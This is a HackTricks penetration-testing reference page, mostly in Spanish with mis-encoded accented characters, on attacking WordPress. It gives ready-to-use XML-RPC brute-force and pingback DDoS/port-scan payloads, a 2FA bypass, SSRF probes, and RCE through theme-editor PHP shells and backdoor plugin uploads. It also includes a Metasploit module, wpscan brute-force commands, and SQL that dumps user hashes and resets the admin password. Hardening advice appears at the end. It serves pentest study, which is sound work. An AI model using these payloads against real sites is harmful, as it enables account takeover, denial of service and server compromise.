# Wordpress

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las **herramientas comunitarias m√°s avanzadas** del mundo.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Basic Information

**Los archivos** subidos van a: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Los archivos de temas se pueden encontrar en /wp-content/themes/,** as√≠ que si cambias alg√∫n php del tema para obtener RCE, probablemente usar√°s esa ruta. Por ejemplo: Usando **el tema twentytwelve** puedes **acceder** al archivo **404.php** en: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Otra URL √∫til podr√≠a ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

En **wp-config.php** puedes encontrar la contrase√±a ra√≠z de la base de datos.

Rutas de inicio de sesi√≥n predeterminadas para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

* `index.php`
* `license.txt` contiene informaci√≥n √∫til como la versi√≥n de WordPress instalada.
* `wp-activate.php` se utiliza para el proceso de activaci√≥n por correo electr√≥nico al configurar un nuevo sitio de WordPress.
* Carpetas de inicio de sesi√≥n (pueden ser renombradas para ocultarlas):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` es un archivo que representa una caracter√≠stica de WordPress que permite que los datos se transmitan con HTTP actuando como el mecanismo de transporte y XML como el mecanismo de codificaci√≥n. Este tipo de comunicaci√≥n ha sido reemplazada por la [REST API](https://developer.wordpress.org/rest-api/reference) de WordPress.
* La carpeta `wp-content` es el directorio principal donde se almacenan los plugins y temas.
* `wp-content/uploads/` es el directorio donde se almacenan los archivos subidos a la plataforma.
* `wp-includes/` Este es el directorio donde se almacenan los archivos principales, como certificados, fuentes, archivos JavaScript y widgets.
* `wp-sitemap.xml` En las versiones de WordPress 5.5 y superiores, WordPress genera un archivo XML de mapa del sitio con todas las publicaciones p√∫blicas y tipos de publicaciones y taxonom√≠as consultables p√∫blicamente.

**Post exploitation**

* El archivo `wp-config.php` contiene informaci√≥n requerida por WordPress para conectarse a la base de datos, como el nombre de la base de datos, el host de la base de datos, el nombre de usuario y la contrase√±a, las claves de autenticaci√≥n y las sales, y el prefijo de la tabla de la base de datos. Este archivo de configuraci√≥n tambi√©n se puede utilizar para activar el modo DEBUG, lo que puede ser √∫til para la soluci√≥n de problemas.

### Users Permissions

* **Administrator**
* **Editor**: Publica y gestiona sus propias publicaciones y las de otros
* **Author**: Publica y gestiona sus propias publicaciones
* **Contributor**: Escribe y gestiona sus publicaciones pero no puede publicarlas
* **Subscriber**: Navega por las publicaciones y edita su perfil

## **Passive Enumeration**

### **Get WordPress version**

Verifica si puedes encontrar los archivos `/license.txt` o `/readme.html`

Dentro del **c√≥digo fuente** de la p√°gina (ejemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* Archivos de enlace CSS

![](<../../.gitbook/assets/image (533).png>)

* Archivos JavaScript

![](<../../.gitbook/assets/image (524).png>)

### Obtener Plugins

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtener Temas

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraer versiones en general

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las **herramientas comunitarias m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Enumeraci√≥n activa

### Plugins y Temas

Probablemente no podr√°s encontrar todos los Plugins y Temas posibles. Para descubrir todos ellos, necesitar√°s **forzar activamente una lista de Plugins y Temas** (esperemos que existan herramientas automatizadas que contengan estas listas).

### Usuarios

**ID Brute**

Obtienes usuarios v√°lidos de un sitio de WordPress forzando los IDs de los usuarios:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Si las respuestas son **200** o **30X**, eso significa que el id es **v√°lido**. Si la respuesta es **400**, entonces el id es **inv√°lido**.

**wp-json**

Tambi√©n puedes intentar obtener informaci√≥n sobre los usuarios consultando:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Otro endpoint `/wp-json/` que puede revelar informaci√≥n sobre los usuarios es:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Nota que este endpoint solo expone usuarios que han hecho una publicaci√≥n. **Solo se proporcionar√° informaci√≥n sobre los usuarios que tienen esta funci√≥n habilitada**.

Tambi√©n ten en cuenta que **/wp-json/wp/v2/pages** podr√≠a leak direcciones IP.

#### Enumeraci√≥n de nombres de usuario de inicio de sesi√≥n

Al iniciar sesi√≥n en **`/wp-login.php`**, el **mensaje** es **diferente** si el **nombre de usuario existe o no**.

### XML-RPC

Si `xml-rpc.php` est√° activo, puedes realizar un ataque de fuerza bruta de credenciales o usarlo para lanzar ataques DoS a otros recursos. (Puedes automatizar este proceso [usando esto](https://github.com/relarizky/wpxploit) por ejemplo).

Para ver si est√° activo, intenta acceder a _**/xmlrpc.php**_ y env√≠a esta solicitud:

**Verificar**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Fuerza Bruta de Credenciales**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** son algunos de los m√©todos que se pueden utilizar para forzar credenciales. Si puedes encontrar alguno de ellos, puedes enviar algo como:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
El mensaje _"Nombre de usuario o contrase√±a incorrectos"_ dentro de una respuesta de c√≥digo 200 deber√≠a aparecer si las credenciales no son v√°lidas.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

Usando las credenciales correctas, puedes subir un archivo. En la respuesta, la ruta aparecer√° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Tambi√©n hay una **manera m√°s r√°pida** de forzar credenciales usando **`system.multicall`** ya que puedes probar varias credenciales en la misma solicitud:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este m√©todo est√° destinado a programas y no a humanos, y es antiguo, por lo tanto, no soporta 2FA. As√≠ que, si tienes credenciales v√°lidas pero la entrada principal est√° protegida por 2FA, **podr√≠as abusar de xmlrpc.php para iniciar sesi√≥n con esas credenciales eludiendo 2FA**. Ten en cuenta que no podr√°s realizar todas las acciones que puedes hacer a trav√©s de la consola, pero a√∫n podr√≠as llegar a RCE como lo explica Ippsec en [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS o escaneo de puertos**

Si puedes encontrar el m√©todo _**pingback.ping**_ dentro de la lista, puedes hacer que Wordpress env√≠e una solicitud arbitraria a cualquier host/puerto.\
Esto se puede usar para pedir a **miles** de **sitios** de Wordpress que **accedan** a una **ubicaci√≥n** (as√≠ se causa un **DDoS** en esa ubicaci√≥n) o puedes usarlo para hacer que **Wordpress** lo **escanee** en alguna **red** interna (puedes indicar cualquier puerto).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si obtienes **faultCode** con un valor **mayor** que **0** (17), significa que el puerto est√° abierto.

Echa un vistazo al uso de **`system.multicall`** en la secci√≥n anterior para aprender c√≥mo abusar de este m√©todo para causar DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Este archivo generalmente existe en la ra√≠z del sitio de Wordpress: **`/wp-cron.php`**\
Cuando este archivo es **accedido**, se realiza una **consulta** MySQL "**pesada**", por lo que podr√≠a ser utilizado por **atacantes** para **causar** un **DoS**.\
Adem√°s, por defecto, el `wp-cron.php` se llama en cada carga de p√°gina (cada vez que un cliente solicita cualquier p√°gina de Wordpress), lo que en sitios de alto tr√°fico puede causar problemas (DoS).

Se recomienda deshabilitar Wp-Cron y crear un cronjob real dentro del host que realice las acciones necesarias en un intervalo regular (sin causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Intenta acceder a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ y el sitio de Wordpress puede hacer una solicitud a ti.

Esta es la respuesta cuando no funciona:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Esta herramienta verifica si el **methodName: pingback.ping** y para la ruta **/wp-json/oembed/1.0/proxy** y si existe, intenta explotarlos.

### Herramientas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente impulsados por las **herramientas comunitarias m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Obt√©n acceso sobrescribiendo un bit

M√°s que un ataque real, esto es una curiosidad. En el CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) podr√≠as cambiar 1 bit de cualquier archivo de wordpress. As√≠ que podr√≠as cambiar la posici√≥n `5389` del archivo `/var/www/html/wp-includes/user.php` para NOP la operaci√≥n NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modificando un php del tema utilizado (se necesitan credenciales de administrador)**

Apariencia ‚Üí Editor de temas ‚Üí Plantilla 404 (a la derecha)

Cambia el contenido por un shell php:

![](<../../.gitbook/assets/image (384).png>)

Busca en internet c√≥mo puedes acceder a esa p√°gina actualizada. En este caso, debes acceder aqu√≠: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puedes usar:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

Puede ser posible subir archivos .php como un plugin.\
Crea tu puerta trasera en php usando, por ejemplo:

![](<../../.gitbook/assets/image (183).png>)

Luego agrega un nuevo plugin:

![](<../../.gitbook/assets/image (722).png>)

Sube el plugin y presiona Instalar ahora:

![](<../../.gitbook/assets/image (249).png>)

Haz clic en Proceder:

![](<../../.gitbook/assets/image (70).png>)

Probablemente esto no har√° nada aparentemente, pero si vas a Medios, ver√°s tu shell subida:

![](<../../.gitbook/assets/image (462).png>)

Accede a ella y ver√°s la URL para ejecutar la shell inversa:

![](<../../.gitbook/assets/image (1006).png>)

### Subiendo y activando un plugin malicioso

Este m√©todo implica la instalaci√≥n de un plugin malicioso conocido por ser vulnerable y puede ser explotado para obtener una web shell. Este proceso se lleva a cabo a trav√©s del panel de control de WordPress de la siguiente manera:

1. **Adquisici√≥n del Plugin**: El plugin se obtiene de una fuente como Exploit DB como [**aqu√≠**](https://www.exploit-db.com/exploits/36374).
2. **Instalaci√≥n del Plugin**:
* Navega al panel de control de WordPress, luego ve a `Panel > Plugins > Subir Plugin`.
* Sube el archivo zip del plugin descargado.
3. **Activaci√≥n del Plugin**: Una vez que el plugin se instala correctamente, debe ser activado a trav√©s del panel.
4. **Explotaci√≥n**:
* Con el plugin "reflex-gallery" instalado y activado, puede ser explotado ya que se sabe que es vulnerable.
* El marco Metasploit proporciona un exploit para esta vulnerabilidad. Al cargar el m√≥dulo apropiado y ejecutar comandos espec√≠ficos, se puede establecer una sesi√≥n meterpreter, otorgando acceso no autorizado al sitio.
* Se se√±ala que este es solo uno de los muchos m√©todos para explotar un sitio de WordPress.

El contenido incluye ayudas visuales que representan los pasos en el panel de control de WordPress para instalar y activar el plugin. Sin embargo, es importante se√±alar que explotar vulnerabilidades de esta manera es ilegal y poco √©tico sin la debida autorizaci√≥n. Esta informaci√≥n debe ser utilizada de manera responsable y solo en un contexto legal, como pruebas de penetraci√≥n con permiso expl√≠cito.

**Para pasos m√°s detallados consulta:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS a RCE

* [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ es un script dise√±ado para escalar una **vulnerabilidad de Cross-Site Scripting (XSS)** a **Remote Code Execution (RCE)** u otras vulnerabilidades cr√≠ticas en WordPress. Para m√°s informaci√≥n consulta [**esta publicaci√≥n**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Proporciona **soporte para las versiones de Wordpress 6.X.X, 5.X.X y 4.X.X y permite:**
* _**Escalaci√≥n de Privilegios:**_ Crea un usuario en WordPress.
* _**(RCE) Subida de Plugin Personalizado (puerta trasera):**_ Sube tu plugin personalizado (puerta trasera) a WordPress.
* _**(RCE) Edici√≥n de Plugin Incorporado:**_ Edita un Plugin Incorporado en WordPress.
* _**(RCE) Edici√≥n de Tema Incorporado:**_ Edita un Tema Incorporado en WordPress.
* _**(Personalizado) Explotaciones Personalizadas:**_ Explotaciones Personalizadas para Plugins/Temas de Terceros en WordPress.

## Post Explotaci√≥n

Extraer nombres de usuario y contrase√±as:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiar la contrase√±a de administrador:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superficie de Ataque

Conocer c√≥mo un plugin de Wordpress puede exponer funcionalidad es clave para encontrar vulnerabilidades en su funcionalidad. Puedes encontrar c√≥mo un plugin podr√≠a exponer funcionalidad en los siguientes puntos y algunos ejemplos de plugins vulnerables en [**este blog**](https://nowotarski.info/wordpress-nonce-authorization/).

* **`wp_ajax`**&#x20;

Una de las formas en que un plugin puede exponer funciones a los usuarios es a trav√©s de manejadores AJAX. Estos podr√≠an contener errores de l√≥gica, autorizaci√≥n o autenticaci√≥n. Adem√°s, es bastante frecuente que estas funciones basen tanto la autenticaci√≥n como la autorizaci√≥n en la existencia de un nonce de Wordpress que **cualquier usuario autenticado en la instancia de Wordpress podr√≠a tener** (independientemente de su rol).

Estas son las funciones que se pueden usar para exponer una funci√≥n en un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**El uso de `nopriv` hace que el endpoint sea accesible por cualquier usuario (incluso los no autenticados).**

{% hint style="danger" %}
Adem√°s, si la funci√≥n solo est√° verificando la autorizaci√≥n del usuario con la funci√≥n `wp_verify_nonce`, esta funci√≥n solo est√° comprobando que el usuario ha iniciado sesi√≥n, generalmente no est√° verificando el rol del usuario. Por lo tanto, los usuarios con bajos privilegios podr√≠an tener acceso a acciones de altos privilegios.
{% endhint %}

* **REST API**

Tambi√©n es posible exponer funciones de WordPress registrando una API REST utilizando la funci√≥n `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
El `permission_callback` es una funci√≥n de retorno que verifica si un usuario dado est√° autorizado para llamar al m√©todo de la API.

**Si se utiliza la funci√≥n incorporada `__return_true`, simplemente se omitir√° la verificaci√≥n de permisos del usuario.**

* **Acceso directo al archivo php**

Por supuesto, WordPress utiliza PHP y los archivos dentro de los plugins son accesibles directamente desde la web. As√≠ que, en caso de que un plugin est√© exponiendo alguna funcionalidad vulnerable que se activa simplemente accediendo al archivo, ser√° explotable por cualquier usuario.

## Protecci√≥n de WordPress

### Actualizaciones Regulares

Aseg√∫rate de que WordPress, los plugins y los temas est√©n actualizados. Tambi√©n confirma que la actualizaci√≥n autom√°tica est√© habilitada en wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Tambi√©n, **solo instala plugins y temas de WordPress confiables**.

### Plugins de Seguridad

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Otras Recomendaciones**

* Eliminar el usuario **admin** por defecto
* Usar **contrase√±as fuertes** y **2FA**
* Revisar peri√≥dicamente los **permisos** de los usuarios
* **Limitar los intentos de inicio de sesi√≥n** para prevenir ataques de Fuerza Bruta
* Renombrar el archivo **`wp-admin.php`** y permitir el acceso solo internamente o desde ciertas direcciones IP.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
